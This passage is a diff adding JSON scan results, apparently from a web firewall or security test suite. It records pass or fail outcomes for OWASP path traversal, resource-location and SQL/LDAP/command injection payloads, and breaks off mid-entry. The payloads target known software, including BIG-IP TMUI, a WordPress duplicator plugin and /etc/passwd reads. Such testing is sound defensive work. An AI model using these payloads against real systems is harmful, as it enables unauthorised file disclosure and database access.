@@ -1,0 +1,1986 @@
+{
+  "A01:2021 - Broken Access Control": {
+    "Details": {
+      "Failed": {
+        "1": {
+          "location": "Header: referer",
+          "payload": "/images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken)",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "2": {
+          "location": "Header: referer",
+          "payload": "/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "3": {
+          "location": "Header: referer",
+          "payload": "/manager/network_query.php?portNum=80&queryType=all&target=q5u4a3l2y1s.com%3Bcat+c:\\boot.ini&Submit=Do+It",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "4": {
+          "location": "Header: referer",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "5": {
+          "location": "Header: referer",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "6": {
+          "location": "Header: referer",
+          "payload": "/index.php/Home/uploadify/fileList?path=../../../&type=.+",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "7": {
+          "location": "Header: referer",
+          "payload": "/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "8": {
+          "location": "Header: referer",
+          "payload": "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "9": {
+          "location": "Header: referer",
+          "payload": "/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "10": {
+          "location": "Header: referer",
+          "payload": "..%255c",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "11": {
+          "location": "Header: referer",
+          "payload": ".%5c../..%5c",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "12": {
+          "location": "cookie:token",
+          "payload": "/..%c0%9v../",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "13": {
+          "location": "Header: referer",
+          "payload": "/..%c0%9v../",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "14": {
+          "location": "url",
+          "payload": "/..%c0%af../",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "15": {
+          "location": "cookie:token",
+          "payload": "/..%c0%af../",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "16": {
+          "location": "Header: referer",
+          "payload": "/..%c0%af../",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "17": {
+          "location": "Header: referer",
+          "payload": "/..%255c..%255c",
+          "result": null,
+          "test": "Path Traversal - URL"
+        },
+        "18": {
+          "location": "url",
+          "payload": "/%00/",
+          "result": null,
+          "test": "Predictable Resource Location - URL"
+        },
+        "19": {
+          "location": "url",
+          "payload": "/%2e/",
+          "result": null,
+          "test": "Predictable Resource Location - URL"
+        },
+        "20": {
+          "location": "url",
+          "payload": "/%2f/",
+          "result": null,
+          "test": "Predictable Resource Location - URL"
+        },
+        "21": {
+          "location": "url",
+          "payload": "/%5c/",
+          "result": null,
+          "test": "Predictable Resource Location - URL"
+        },
+        "22": {
+          "location": "url",
+          "payload": "/%3f.jsp",
+          "result": null,
+          "test": "Predictable Resource Location - URL"
+        },
+        "23": {
+          "location": "url",
+          "payload": "/?M=D",
+          "result": null,
+          "test": "Predictable Resource Location - URL"
+        },
+        "24": {
+          "location": "url",
+          "payload": "/?S=D",
+          "result": null,
+          "test": "Predictable Resource Location - URL"
+        }
+      },
+      "Passed": {
+        "1": {
+          "location": "url",
+          "payload": "/images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken)",
+          "result": "3a0b5c50-1a8b-483d-9d17-80db82daadb8",
+          "test": "Path Traversal - URL"
+        },
+        "2": {
+          "location": "cookie:token",
+          "payload": "/images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken)",
+          "result": "96de76d9-365d-4920-a0b5-41da0aee0e07",
+          "test": "Path Traversal - URL"
+        },
+        "3": {
+          "location": "url",
+          "payload": "/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php",
+          "result": "6edbd9f6-88db-4215-8928-1f19d0ef775c",
+          "test": "Path Traversal - URL"
+        },
+        "4": {
+          "location": "cookie:token",
+          "payload": "/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php",
+          "result": "ba4a7146-7be5-4550-8121-fb69d4c6b441",
+          "test": "Path Traversal - URL"
+        },
+        "5": {
+          "location": "url",
+          "payload": "/manager/network_query.php?portNum=80&queryType=all&target=q5u4a3l2y1s.com%3Bcat+c:\\boot.ini&Submit=Do+It",
+          "result": "9668c45b-71b2-4dd3-8a47-2d31999b6a37",
+          "test": "Path Traversal - URL"
+        },
+        "6": {
+          "location": "cookie:token",
+          "payload": "/manager/network_query.php?portNum=80&queryType=all&target=q5u4a3l2y1s.com%3Bcat+c:\\boot.ini&Submit=Do+It",
+          "result": "98032363-6d98-4164-9442-2d7ef87575fd",
+          "test": "Path Traversal - URL"
+        },
+        "7": {
+          "location": "url",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+          "result": "67830b17-aec9-49c4-abc3-844236f3b92a",
+          "test": "Path Traversal - URL"
+        },
+        "8": {
+          "location": "cookie:token",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+          "result": "387ec5c7-ab33-4825-a467-1d3093c51e94",
+          "test": "Path Traversal - URL"
+        },
+        "9": {
+          "location": "url",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license",
+          "result": "c124e17d-4cb6-4cc8-93a2-4130fbd72bb5",
+          "test": "Path Traversal - URL"
+        },
+        "10": {
+          "location": "cookie:token",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license",
+          "result": "ca9db7e0-21d8-4ecb-9bb5-22f876ed507d",
+          "test": "Path Traversal - URL"
+        },
+        "11": {
+          "location": "url",
+          "payload": "/index.php/Home/uploadify/fileList?path=../../../&type=.+",
+          "result": "be7d30a9-675a-4ca3-a373-0f9ac0b4e83f",
+          "test": "Path Traversal - URL"
+        },
+        "12": {
+          "location": "cookie:token",
+          "payload": "/index.php/Home/uploadify/fileList?path=../../../&type=.+",
+          "result": "c1cc66ba-4573-488c-a453-9a4ef7a338f9",
+          "test": "Path Traversal - URL"
+        },
+        "13": {
+          "location": "url",
+          "payload": "/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd",
+          "result": "9f3caf07-b62d-4aa5-a39b-629277d75665",
+          "test": "Path Traversal - URL"
+        },
+        "14": {
+          "location": "cookie:token",
+          "payload": "/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd",
+          "result": "1305a900-f830-4397-8980-14e9854c8f7e",
+          "test": "Path Traversal - URL"
+        },
+        "15": {
+          "location": "url",
+          "payload": "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development",
+          "result": "25532af9-d985-4839-a420-208075963074",
+          "test": "Path Traversal - URL"
+        },
+        "16": {
+          "location": "cookie:token",
+          "payload": "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development",
+          "result": "f9321846-938e-48f5-af90-5391b04ca8b5",
+          "test": "Path Traversal - URL"
+        },
+        "17": {
+          "location": "url",
+          "payload": "/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "result": "fbc8ab4e-1db0-43ed-ac32-14cb2c2c0946",
+          "test": "Path Traversal - URL"
+        },
+        "18": {
+          "location": "cookie:token",
+          "payload": "/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "result": "d980a469-333b-4a71-9ca7-f24c8af7d685",
+          "test": "Path Traversal - URL"
+        },
+        "19": {
+          "location": "url",
+          "payload": "..%255c",
+          "result": "f5dd59a2-9b1a-4a2d-ba4f-083c049e85bd",
+          "test": "Path Traversal - URL"
+        },
+        "20": {
+          "location": "cookie:token",
+          "payload": "..%255c",
+          "result": "1b3c2660-a9af-4f9d-8d28-180d9f44a55b",
+          "test": "Path Traversal - URL"
+        },
+        "21": {
+          "location": "url",
+          "payload": ".%5c../..%5c",
+          "result": "4aba901c-0b19-43dd-b730-7522a0175373",
+          "test": "Path Traversal - URL"
+        },
+        "22": {
+          "location": "cookie:token",
+          "payload": ".%5c../..%5c",
+          "result": "fbb9e9b2-63da-4e73-9cab-a5c6eb3a4ae0",
+          "test": "Path Traversal - URL"
+        },
+        "23": {
+          "location": "url",
+          "payload": "/..%c0%9v../",
+          "result": "66feee4d-ac82-40dc-93f7-5beb0d38f022",
+          "test": "Path Traversal - URL"
+        },
+        "24": {
+          "location": "url",
+          "payload": "/..%255c..%255c",
+          "result": "6607b32a-0b84-42ce-94c4-820319902aee",
+          "test": "Path Traversal - URL"
+        },
+        "25": {
+          "location": "cookie:token",
+          "payload": "/..%255c..%255c",
+          "result": "10644359-23fe-48f6-a0d5-e5b6aad28929",
+          "test": "Path Traversal - URL"
+        },
+        "26": {
+          "location": "url",
+          "payload": "/apache/logs/error.log",
+          "result": "cab8e6f0-2cf3-4d41-9bf4-e35c9655be48",
+          "test": "Predictable Resource Location - URL"
+        },
+        "27": {
+          "location": "url",
+          "payload": "/apache/logs/access.log",
+          "result": "f43837da-c821-4649-9348-4f2fa114a180",
+          "test": "Predictable Resource Location - URL"
+        },
+        "28": {
+          "location": "url",
+          "payload": "/apache/logs/error.log",
+          "result": "c9761ce6-f764-4bd9-a060-c708e2321709",
+          "test": "Predictable Resource Location - URL"
+        },
+        "29": {
+          "location": "url",
+          "payload": "/apache/logs/access.log",
+          "result": "c9cdf2a8-bd7d-40ef-a626-34e0540fa754",
+          "test": "Predictable Resource Location - URL"
+        },
+        "30": {
+          "location": "url",
+          "payload": "/apache/logs/error.log",
+          "result": "b9ccb9c0-7b39-4e6c-88b8-6b098bb14f93",
+          "test": "Predictable Resource Location - URL"
+        },
+        "31": {
+          "location": "url",
+          "payload": "/apache/logs/access.log",
+          "result": "e4cd40bd-c682-43d2-b72a-adcf65e2e24f",
+          "test": "Predictable Resource Location - URL"
+        },
+        "32": {
+          "location": "url",
+          "payload": "/etc/httpd/logs/acces_log",
+          "result": "4501bd8a-8ad3-42f9-bcc6-405718e294d0",
+          "test": "Predictable Resource Location - URL"
+        },
+        "33": {
+          "location": "url",
+          "payload": "/etc/httpd/logs/acces.log",
+          "result": "d5a06469-5a88-4ea3-9ce0-03bacbb0b97c",
+          "test": "Predictable Resource Location - URL"
+        },
+        "34": {
+          "location": "url",
+          "payload": "/etc/httpd/logs/error_log",
+          "result": "ff97e097-8fd3-48b0-9c48-9f56dbca6bec",
+          "test": "Predictable Resource Location - URL"
+        },
+        "35": {
+          "location": "url",
+          "payload": "/cgi-bin/test-cgi?/*",
+          "result": "13958169-eefd-4680-9ef0-b3d156e9bf93",
+          "test": "Predictable Resource Location - URL"
+        },
+        "36": {
+          "location": "url",
+          "payload": "/cgi-bin/test-cgi?*",
+          "result": "80473dce-4dff-40d8-8d0f-bd3758468adb",
+          "test": "Predictable Resource Location - URL"
+        },
+        "37": {
+          "location": "url",
+          "payload": "/test/",
+          "result": "9640713f-3efe-4dbc-9cbc-6c970c2e47e2",
+          "test": "Predictable Resource Location - URL"
+        },
+        "38": {
+          "location": "url",
+          "payload": "/tmp/",
+          "result": "092e6cfe-fa60-4a0f-9df9-fedcb4fcf0ef",
+          "test": "Predictable Resource Location - URL"
+        },
+        "39": {
+          "location": "url",
+          "payload": "/admin/",
+          "result": "a2c22614-3330-4e4f-adca-8cdda3be5ec6",
+          "test": "Predictable Resource Location - URL"
+        },
+        "40": {
+          "location": "url",
+          "payload": "/etc/httpd/logs/error.log",
+          "result": "81123eeb-d869-43ff-b471-d0e655bc8a61",
+          "test": "Predictable Resource Location - URL"
+        },
+        "41": {
+          "location": "url",
+          "payload": "/var/www/logs/access_log",
+          "result": "9a3165a3-5a02-4340-95fe-6b65d498de2d",
+          "test": "Predictable Resource Location - URL"
+        },
+        "42": {
+          "location": "url",
+          "payload": "/var/www/logs/access.log",
+          "result": "6d8c5ffd-462e-4240-a2a4-929cc5098ffe",
+          "test": "Predictable Resource Location - URL"
+        },
+        "43": {
+          "location": "url",
+          "payload": "/usr/local/apache/logs/access_log",
+          "result": "ae53df40-9f29-443b-a557-5d0c64448c46",
+          "test": "Predictable Resource Location - URL"
+        },
+        "44": {
+          "location": "url",
+          "payload": "/usr/local/apache/logs/access.log",
+          "result": "95833008-694d-40a3-b578-a92b3160b171",
+          "test": "Predictable Resource Location - URL"
+        },
+        "45": {
+          "location": "url",
+          "payload": "/var/log/apache/access_log",
+          "result": "accb9d77-0f27-400b-9098-0c568c1ac5c8",
+          "test": "Predictable Resource Location - URL"
+        },
+        "46": {
+          "location": "url",
+          "payload": "/var/log/apache2/access_log",
+          "result": "e864d539-705a-4dfc-bad0-7f27627e5242",
+          "test": "Predictable Resource Location - URL"
+        },
+        "47": {
+          "location": "url",
+          "payload": "/var/log/apache/access.log",
+          "result": "29b2b2ef-6d3f-4d79-bc9c-ceef0bc9becb",
+          "test": "Predictable Resource Location - URL"
+        },
+        "48": {
+          "location": "url",
+          "payload": "/var/log/apache2/access.log",
+          "result": "96fb0df1-beb9-4c14-afcc-53f8cdfdb795",
+          "test": "Predictable Resource Location - URL"
+        },
+        "49": {
+          "location": "url",
+          "payload": "/var/log/access_log",
+          "result": "04370f32-d1b7-4315-a962-aa1acfe65ddb",
+          "test": "Predictable Resource Location - URL"
+        },
+        "50": {
+          "location": "url",
+          "payload": "/var/log/access.log",
+          "result": "145e6db0-caa1-4db2-b42e-0522ae9d8eae",
+          "test": "Predictable Resource Location - URL"
+        },
+        "51": {
+          "location": "url",
+          "payload": "/var/www/logs/error_log",
+          "result": "d20cfd18-5e43-4dd3-a580-5e96076eddc7",
+          "test": "Predictable Resource Location - URL"
+        },
+        "52": {
+          "location": "url",
+          "payload": "/var/www/logs/error.log",
+          "result": "84568264-6a92-464f-b7b4-42aa57246bf0",
+          "test": "Predictable Resource Location - URL"
+        },
+        "53": {
+          "location": "url",
+          "payload": "/usr/local/apache/logs/error_log",
+          "result": "c9ceaa9c-ed0b-4167-9597-b548dc470a5b",
+          "test": "Predictable Resource Location - URL"
+        },
+        "54": {
+          "location": "url",
+          "payload": "/usr/local/apache/logs/error.log",
+          "result": "fe14a6f6-b9ae-4bb5-8c49-f7505672e8c5",
+          "test": "Predictable Resource Location - URL"
+        },
+        "55": {
+          "location": "url",
+          "payload": "/var/log/apache/error_log",
+          "result": "72bb54fd-0600-4af9-bcb9-3329d3533e0c",
+          "test": "Predictable Resource Location - URL"
+        },
+        "56": {
+          "location": "url",
+          "payload": "/var/log/apache2/error_log",
+          "result": "c0b566b6-03d0-496d-b037-f33dcbaa5782",
+          "test": "Predictable Resource Location - URL"
+        },
+        "57": {
+          "location": "url",
+          "payload": "/var/log/apache/error.log",
+          "result": "b9291d17-97cc-4d5d-a750-4643cf5e09d3",
+          "test": "Predictable Resource Location - URL"
+        },
+        "58": {
+          "location": "url",
+          "payload": "/var/log/apache2/error.log",
+          "result": "198c3c1e-535f-4a4a-b15d-876ffa21b9c9",
+          "test": "Predictable Resource Location - URL"
+        },
+        "59": {
+          "location": "url",
+          "payload": "/var/log/error_log",
+          "result": "f094fa17-af25-4ab1-9911-46cb634dc42b",
+          "test": "Predictable Resource Location - URL"
+        },
+        "60": {
+          "location": "url",
+          "payload": "/var/log/error.log",
+          "result": "7dc08440-ee57-4ff9-a24e-280a00648f78",
+          "test": "Predictable Resource Location - URL"
+        }
+      }
+    },
+    "Summary": {
+      "Failed": 24,
+      "Passed": 60
+    }
+  },
+  "A03:2021 - Injection": {
+    "Details": {
+      "Failed": {},
+      "Passed": {
+        "1": {
+          "location": "Body",
+          "payload": "<>\"'%;)(&+",
+          "result": "be38f3e1-fc6a-4060-825c-fff743aacce1",
+          "test": "SQL Injections - Body"
+        },
+        "2": {
+          "location": "Body",
+          "payload": "'",
+          "result": "454a42df-98ef-4bee-9201-2261ce295227",
+          "test": "SQL Injections - Body"
+        },
+        "3": {
+          "location": "Body",
+          "payload": "1 or 1=1",
+          "result": "c083aeea-c67b-4af6-b0d8-440471655035",
+          "test": "SQL Injections - Body"
+        },
+        "4": {
+          "location": "Body",
+          "payload": "1;SELECT%20*",
+          "result": "3efa75db-bd0d-4c83-a8d6-f77132bf5344",
+          "test": "SQL Injections - Body"
+        },
+        "5": {
+          "location": "Body",
+          "payload": "1 waitfor delay '0:0:10'--",
+          "result": "b3ba9539-2a51-4758-a8c1-bdb9e8269657",
+          "test": "SQL Injections - Body"
+        },
+        "6": {
+          "location": "Body",
+          "payload": "'%20or%20''='",
+          "result": "751ab177-cad2-4899-9bc9-d0fbc3d54ba2",
+          "test": "SQL Injections - Body"
+        },
+        "7": {
+          "location": "Body",
+          "payload": "'%20or%201=1",
+          "result": "417c521b-abeb-47bc-b9c4-0620d39c51f0",
+          "test": "SQL Injections - Body"
+        },
+        "8": {
+          "location": "Body",
+          "payload": "')%20or%20('x'='x",
+          "result": "47d1f743-7a41-48dc-b38b-60ae46fd4870",
+          "test": "SQL Injections - Body"
+        },
+        "9": {
+          "location": "Body",
+          "payload": "'%20or%20'x'='x",
+          "result": "aa6b4702-9001-4dd6-8304-c043a8dff5fd",
+          "test": "SQL Injections - Body"
+        },
+        "10": {
+          "location": "Body",
+          "payload": "%20or%20x=x",
+          "result": "3e4b0ed5-1a11-4550-ab1a-8a5f1a53ef51",
+          "test": "SQL Injections - Body"
+        },
+        "11": {
+          "location": "Body",
+          "payload": "%20'sleep%2050'",
+          "result": "c129749d-b8ea-4c92-b41a-37d2b4483be5",
+          "test": "SQL Injections - Body"
+        },
+        "12": {
+          "location": "Body",
+          "payload": "%20$(sleep%2050)",
+          "result": "540ba756-b4c4-4bcc-9f40-ea6f2201087c",
+          "test": "SQL Injections - Body"
+        },
+        "13": {
+          "location": "Body",
+          "payload": "23 OR 1=1",
+          "result": "676ca6f7-e919-4ec4-8a0f-99faed79a12f",
+          "test": "SQL Injections - Body"
+        },
+        "14": {
+          "location": "Body",
+          "payload": "%27%20or%201=1",
+          "result": "5c420c12-b18e-4d87-97cf-92997ff31249",
+          "test": "SQL Injections - Body"
+        },
+        "15": {
+          "location": "Body",
+          "payload": "%2A%28%7C%28mail%3D%2A%29%29",
+          "result": "affe4e56-d9af-4361-a084-5e763afeee91",
+          "test": "SQL Injections - Body"
+        },
+        "16": {
+          "location": "Body",
+          "payload": "%2A%28%7C%28objectclass%3D%2A%29%29",
+          "result": "dfbda320-b811-49ee-a226-edc1e565fac4",
+          "test": "SQL Injections - Body"
+        },
+        "17": {
+          "location": "Body",
+          "payload": "%2A%7C",
+          "result": "979436e2-264d-4094-9fe3-c20a1914fdea",
+          "test": "SQL Injections - Body"
+        },
+        "18": {
+          "location": "Body",
+          "payload": "'||'6",
+          "result": "4304a53b-d4d4-4356-9834-3f908f409b3a",
+          "test": "SQL Injections - Body"
+        },
+        "19": {
+          "location": "Body",
+          "payload": "' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",
+          "result": "c0f8ec1e-fc84-4163-81e1-6c192972bfa8",
+          "test": "SQL Injections - Body"
+        },
+        "20": {
+          "location": "Body",
+          "payload": "' and 1 in (select var from temp)--",
+          "result": "f53b5b46-784e-4d63-a166-74e3c3c01b3a",
+          "test": "SQL Injections - Body"
+        },
+        "21": {
+          "location": "Body",
+          "payload": "anything' OR 'x'='x",
+          "result": "6f6a2807-0019-46e8-a68c-88133c810484",
+          "test": "SQL Injections - Body"
+        },
+        "22": {
+          "location": "Body",
+          "payload": "\"a\"\" or 1=1--\"",
+          "result": "87971586-0db2-4579-ba87-320732ade1ac",
+          "test": "SQL Injections - Body"
+        },
+        "23": {
+          "location": "Body",
+          "payload": "a' or 1=1--",
+          "result": "ad18ae07-7405-4363-b85f-05a5ddc655d8",
+          "test": "SQL Injections - Body"
+        },
+        "24": {
+          "location": "Body",
+          "payload": "\"a\"\" or 3=3--\"",
+          "result": "de9fd309-27ac-4848-941e-9e3b445ccdf0",
+          "test": "SQL Injections - Body"
+        },
+        "25": {
+          "location": "Body",
+          "payload": "a' or 3=3--",
+          "result": "f4961e6c-884f-4030-bfa7-c5a7dbc75879",
+          "test": "SQL Injections - Body"
+        },
+        "26": {
+          "location": "Body",
+          "payload": "a' or 'a' = 'a",
+          "result": "4e981963-cf13-42be-8f4b-97156c0ae025",
+          "test": "SQL Injections - Body"
+        },
+        "27": {
+          "location": "Body",
+          "payload": "&apos;%20OR",
+          "result": "2bbf6bc3-1f23-4141-b1d4-058ba8ac89bf",
+          "test": "SQL Injections - Body"
+        },
+        "28": {
+          "location": "Body",
+          "payload": "' having 1=1--",
+          "result": "236d085a-e37d-41aa-aaa5-64c0474aa518",
+          "test": "SQL Injections - Body"
+        },
+        "29": {
+          "location": "Body",
+          "payload": "hi or 1=1 --\"",
+          "result": "5f24a6a8-17dc-4114-86ad-b514691b8fab",
+          "test": "SQL Injections - Body"
+        },
+        "30": {
+          "location": "Body",
+          "payload": "hi' or 1=1 --",
+          "result": "17771fd7-8f11-49ac-96e9-bd214d9324b2",
+          "test": "SQL Injections - Body"
+        },
+        "31": {
+          "location": "Body",
+          "payload": "\"hi\"\") or (\"\"a\"\"=\"\"a\"",
+          "result": "523123f2-d323-4e67-a660-13e1231df701",
+          "test": "SQL Injections - Body"
+        },
+        "32": {
+          "location": "Body",
+          "payload": "hi' or 'a'='a",
+          "result": "58443506-6357-4581-8fb4-bac9bd87d0da",
+          "test": "SQL Injections - Body"
+        },
+        "33": {
+          "location": "Body",
+          "payload": "hi') or ('a'='a",
+          "result": "7a89d518-f00b-4df8-a926-4b8fac297a7c",
+          "test": "SQL Injections - Body"
+        },
+        "34": {
+          "location": "Body",
+          "payload": "'hi' or 'x'='x';",
+          "result": "4fa322b3-6bac-4b18-83d0-5b0126c67f8a",
+          "test": "SQL Injections - Body"
+        },
+        "35": {
+          "location": "Body",
+          "payload": "*(|(mail=*))",
+          "result": "8a3bbcbc-4c28-45e7-b49a-b30b3a7f06ec",
+          "test": "SQL Injections - Body"
+        },
+        "36": {
+          "location": "Body",
+          "payload": "*(|(objectclass=*))",
+          "result": "06b5df51-62fc-47d4-9602-e0ee1093dcaa",
+          "test": "SQL Injections - Body"
+        },
+        "37": {
+          "location": "Body",
+          "payload": "' or ''='",
+          "result": "1ebac3c7-5913-4724-8cd8-2bc42808893d",
+          "test": "SQL Injections - Body"
+        },
+        "38": {
+          "location": "Body",
+          "payload": "or 0=0 #\"",
+          "result": "87043817-40fc-400b-a05e-ddf8804c281a",
+          "test": "SQL Injections - Body"
+        },
+        "39": {
+          "location": "Body",
+          "payload": "' or 0=0 --",
+          "result": "27c33891-72bf-4560-b8b6-f9abc2917a9d",
+          "test": "SQL Injections - Body"
+        },
+        "40": {
+          "location": "Body",
+          "payload": "' or 0=0 #",
+          "result": "70b072b1-ef95-4cc5-ab58-07a12dc9ea94",
+          "test": "SQL Injections - Body"
+        },
+        "41": {
+          "location": "Body",
+          "payload": "or 0=0 --",
+          "result": "d64838a6-adaa-4afe-90d9-4f8cd69aefff",
+          "test": "SQL Injections - Body"
+        },
+        "42": {
+          "location": "Body",
+          "payload": "or 0=0 #",
+          "result": "7a0d7dc8-86e1-4023-acd3-fe506eadfd57",
+          "test": "SQL Injections - Body"
+        },
+        "43": {
+          "location": "Body",
+          "payload": "; or '1'='1'",
+          "result": "1062ed2c-d0b7-4666-9413-e9bae04b0817",
+          "test": "SQL Injections - Body"
+        },
+        "44": {
+          "location": "Body",
+          "payload": "' or '1'='1",
+          "result": "b9491d52-1eb6-4234-858c-7ecdfba12c0e",
+          "test": "SQL Injections - Body"
+        },
+        "45": {
+          "location": "Body",
+          "payload": "' or '1'='1'--",
+          "result": "5d26936b-bc4d-4b25-83fc-6c17baf6b746",
+          "test": "SQL Injections - Body"
+        },
+        "46": {
+          "location": "Body",
+          "payload": "' or 1=1",
+          "result": "a088d7f4-712a-43f5-9631-8c9a2bd494dc",
+          "test": "SQL Injections - Body"
+        },
+        "47": {
+          "location": "Body",
+          "payload": "' or 1=1 /*",
+          "result": "4d7e9c0e-efb7-4cb5-9cbf-e4955c1c1a3d",
+          "test": "SQL Injections - Body"
+        },
+        "48": {
+          "location": "Body",
+          "payload": "' or 1=1--",
+          "result": "98dd24e8-df3a-42e3-a410-3d445fadc4db",
+          "test": "SQL Injections - Body"
+        },
+        "49": {
+          "location": "Body",
+          "payload": "' or 1=1--",
+          "result": "18b93fa0-a64a-434f-aa28-8c1d85dacadc",
+          "test": "SQL Injections - Body"
+        },
+        "50": {
+          "location": "Body",
+          "payload": "'/**/or/**/1/**/=/**/1",
+          "result": "5eecbbf0-0e44-4b15-9ac7-f8b24a5c10ac",
+          "test": "SQL Injections - Body"
+        },
+        "51": {
+          "location": "Body",
+          "payload": "|",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "52": {
+          "location": "Body",
+          "payload": "!",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "53": {
+          "location": "Body",
+          "payload": "?",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "54": {
+          "location": "Body",
+          "payload": "/",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "55": {
+          "location": "Body",
+          "payload": "//",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "56": {
+          "location": "Body",
+          "payload": "//*",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "57": {
+          "location": "Body",
+          "payload": "' --",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "58": {
+          "location": "Body",
+          "payload": "%26",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "59": {
+          "location": "Body",
+          "payload": "%28",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "60": {
+          "location": "Body",
+          "payload": "%29",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "61": {
+          "location": "Body",
+          "payload": "%21",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "62": {
+          "location": "Body",
+          "payload": "||6",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "63": {
+          "location": "Body",
+          "payload": "(||6)",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "64": {
+          "location": "Body",
+          "payload": "%7C",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "65": {
+          "location": "Body",
+          "payload": "a'",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "66": {
+          "location": "Body",
+          "payload": "' or 1/*",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "67": {
+          "location": "Body",
+          "payload": "insert",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "68": {
+          "location": "Body",
+          "payload": "like",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "69": {
+          "location": "Body",
+          "payload": "limit",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "70": {
+          "location": "Body",
+          "payload": "or",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "71": {
+          "location": "Body",
+          "payload": "hi or a=a",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "72": {
+          "location": "Body",
+          "payload": "admin' or '",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "73": {
+          "location": "Body",
+          "payload": "' or 1 --'",
+          "result": null,
+          "test": "SQL Injections - Body"
+        },
+        "74": {
+          "location": "Parameter: search",
+          "payload": "1;SELECT%20*",
+          "result": "0e364984-1194-4c33-b97f-fea075a7b8e1",
+          "test": "SQL Injections - Parameters"
+        },
+        "75": {
+          "location": "Parameter: search",
+          "payload": "1 waitfor delay '0:0:10'--",
+          "result": "3ad589e2-cbd6-4375-9248-3d9c17091c20",
+          "test": "SQL Injections - Parameters"
+        },
+        "76": {
+          "location": "Parameter: search",
+          "payload": "'%20or%20''='",
+          "result": "c3aa0490-9e69-4753-9bbd-0bb33f153913",
+          "test": "SQL Injections - Parameters"
+        },
+        "77": {
+          "location": "Parameter: search",
+          "payload": "'%20or%201=1",
+          "result": "93dc12b0-dc39-472f-8e07-d80d72de6b95",
+          "test": "SQL Injections - Parameters"
+        },
+        "78": {
+          "location": "Parameter: search",
+          "payload": "')%20or%20('x'='x",
+          "result": "555d850a-0df7-441f-af2a-353bc0e71027",
+          "test": "SQL Injections - Parameters"
+        },
+        "79": {
+          "location": "Parameter: search",
+          "payload": "'%20or%20'x'='x",
+          "result": "b830d95f-3d10-4773-a3c5-d1e002286d5e",
+          "test": "SQL Injections - Parameters"
+        },
+        "80": {
+          "location": "Parameter: search",
+          "payload": "%20or%20x=x",
+          "result": "83986ee4-bde5-41bd-a129-f7ae7f92bcd9",
+          "test": "SQL Injections - Parameters"
+        },
+        "81": {
+          "location": "Parameter: search",
+          "payload": "%20'sleep%2050'",
+          "result": "c8420cbd-aca5-4b7d-b812-6706ad8a6acd",
